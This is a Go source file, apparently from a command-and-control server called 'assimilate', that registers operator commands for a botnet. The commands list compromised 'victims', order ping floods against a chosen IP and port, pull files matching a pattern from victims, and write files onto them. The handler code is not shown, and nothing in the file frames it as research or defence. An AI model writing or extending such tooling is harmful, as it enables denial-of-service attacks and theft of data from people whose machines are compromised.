package options

import (
	"assimilate/c2c_server/v2/internal/handlers"
	"assimilate/c2c_server/v2/internal/model"
	"assimilate/c2c_server/v2/internal/types"
)

func Options(state *model.ServerState) []types.Option {
	return []types.Option{
		{
			Cmd:         "/help",
			Action:      &types.HelpWrapper{HandlerFunc: handlers.SpecificHelp},
			Description: "Usage: /help",
		},
		{
			Cmd:         "/clear",
			Action:      &types.ClearWrapper{HandlerFunc: handlers.CallClear},
			Description: "Usage: /clear",
		},
		{
			Cmd:         "/exit",
			Action:      &types.ExitWrapper{HandlerFunc: handlers.ExitFunction},
			Description: "Usage: /exit",
		},
		{
			Cmd:         "/list",
			Action:      &types.ListVictimsWrapper{HandlerFunc: handlers.ListVictims(state)},
			Description: "Usage: /list",
		},
		{
			Cmd:         "/floodping",
			Action:      &types.FloodPingWrapper{HandlerFunc: handlers.FloodPing(state)},
			Description: "Usage: /floodping <victimHash> <ip> <port>",
		},
		{
			Cmd:         "/supercat",
			Action:      &types.SuperCatWrapper{HandlerFunc: handlers.SuperCat(state)},
			Description: "Usage: /supercat <victimHash> <filePattern>",
		},
		{
			Cmd:         "/writefile",
			Action:      &types.WriteFileWrapper{HandlerFunc: handlers.WriteFile(state)},
			Description: "Usage: /writeFile <victimHash> <file1> [file2] ...",
		},
		{
			Cmd:         "/showsupercat",
			Action:      &types.ShowSuperCatWrapper{HandlerFunc: handlers.ShowSuperCat(state)},
			Description: "Usage: /showsupercat <victimHash>",
		},
	}
}
